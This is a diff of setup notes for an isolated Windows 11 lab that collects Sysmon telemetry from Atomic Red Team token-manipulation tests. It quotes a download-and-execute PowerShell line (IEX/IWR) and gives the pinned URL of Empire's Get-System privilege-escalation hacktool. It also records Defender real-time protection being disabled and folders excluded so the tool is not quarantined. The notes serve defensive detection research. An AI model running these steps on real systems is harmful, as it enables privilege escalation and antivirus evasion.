@@ -6,18 +6,29 @@ proceeds; empty until then.
 
 ## Machine
 
-- Base: _clone of `CPES-Windows11-Lab12` @ `vm-live-v1-ready`_ (or fresh Windows 11). VM `CPES-Windows11-VM3`.
-- Windows 11 build: _TBD_. Host-only IP: _TBD_. USB off; clipboard and drag-and-drop disabled.
-- Sysmon: _TBD_ with `sysmon-config-v2.xml`, config hash `B58F8F5B…2373E2C8`. Elasticsearch + Winlogbeat 9.4.3,
-  index `cpes-live-vm3`.
-- UAC binaries present: eventvwr, fodhelper, ComputerDefaults, **sdclt** (all on Windows 11).
+- Base: **full clone of `CPES-Windows11-Lab12` @ `vm-live-v1-ready`** (2026-10-29). VM `CPES-Windows11-VM3`,
+  user `cpeslab` ("CPES Lab"). Host-only IP **192.168.56.103**; USB off; clipboard and drag-and-drop disabled.
+- Sysmon running, config hash `B58F8F5B…2373E2C8` (same v2 config). Audit *Security System Extension* = Success.
+- Elasticsearch 9.4.3: the clone ran it by hand, so it was **installed as an auto-start Windows service** here
+  (`elasticsearch-service-x64`) with a 2 GB heap cap (`jvm.options.d\heap.options`). Winlogbeat 9.4.3 repointed to
+  index **`cpes-live-vm3`** (`winlogbeat setup --pipelines --index-management`, service restarted). The clone's old
+  `cpes-live-v1` index stays on disk and is untouched (export reads `cpes-live-vm3` by time range).
+- Preflight: **26 OK**, every UAC binary present including **`sdclt.exe`** and all ten test prerequisites; the only
+  FAIL is "no internet route", which is expected while the setup NAT adapter is still on (clears in freeze).
 
 ## Token-offline shim
 
-- Script URL fetched during setup: _TBD_.
-- `Get-System.ps1` SHA-256 pin: _TBD_ (set in `token-offline-profile.ps1` `$CPES_TokenScriptSha256` and
-  installed as `$PSHOME\Profile.ps1`).
-- `CPES-TokenScriptOk` at freeze: _TBD (must be True)_.
+- Both T1134.001 tests run `IEX (IWR '<raw url>'); Get-System -Technique ...`. URL fetched and pinned during setup:
+  `https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1`
+  (26,498 chars), SHA-256 **`678ADADA054703A176940399C9CFB3EAA050C2FFDBAB8365CD60B6B714A99F22`**.
+- `token-offline-profile.ps1` installed as `$PSHOME\Profile.ps1` with that pin; it serves the one URL from the local
+  copy and passes every other request through. **`CPES-TokenScriptOk` = True** at freeze.
+- **Defender notes.** Get-System.ps1 is a flagged hacktool: real-time protection quarantines it in-flight even with a
+  folder exclusion, so during setup RT was turned off only for the fetch, `C:\CPES-session` was added to Defender
+  exclusions (as `C:\AtomicRedTeam` already is), and RT was turned back **on** for the benign period
+  (RealTimeProtectionEnabled = True at freeze). A guard bug in the first shim (setup's text-replace of the sentinel
+  hit the guard check too, inverting it) was fixed before freeze: the guard now checks the pin length, not the
+  sentinel literal.
 
 ## Pilot (throwaway)
 
